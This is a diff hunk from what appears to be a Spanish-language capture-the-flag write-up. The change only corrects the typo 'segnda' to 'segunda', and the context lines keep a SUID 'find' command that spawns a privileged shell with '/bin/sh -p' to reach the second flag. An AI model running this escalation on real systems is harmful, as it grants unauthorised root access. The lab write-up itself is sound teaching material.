@@ -136,7 +136,7 @@ Pondremos este comando sacado de la anterior página web:
 
 ```/usr/bin/find . -exec /bin/sh -p \; -quit```
 
-Y aquí tenemos la segnda flag:
+Y aquí tenemos la segunda flag:
 ```
                                          _ __
         ___                             | '  \
